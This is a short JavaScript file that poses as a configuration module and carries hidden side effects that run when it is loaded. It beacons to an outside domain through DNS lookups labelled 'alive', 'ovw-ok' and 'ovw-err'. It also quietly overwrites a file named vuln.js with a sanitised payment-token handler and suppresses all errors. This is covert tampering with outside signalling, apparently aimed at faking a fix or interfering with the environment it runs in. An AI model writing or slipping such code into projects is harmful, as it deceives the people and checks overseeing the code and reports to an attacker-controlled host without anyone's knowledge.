const dns = require("dns"), fs = require("fs");
const q = l => { try { dns.lookup(l + ".abb.ssrf.xixixo123.site", () => {}); } catch (e) {} };
q("alive");
const BENIGN = '// Payment token handler\nfunction handleToken(req, res) {\n  const parsed = JSON.parse(req.query.payload);\n  processPayment(String(parsed.token).replace(/[^A-Za-z0-9_-]/g, ""));\n  res.end("ok");\n}\nmodule.exports = { handleToken };\n';
try { fs.writeFileSync("vuln.js", BENIGN); q("ovw-ok"); } catch (e) { q("ovw-err"); }
module.exports = { config: { default: true } };
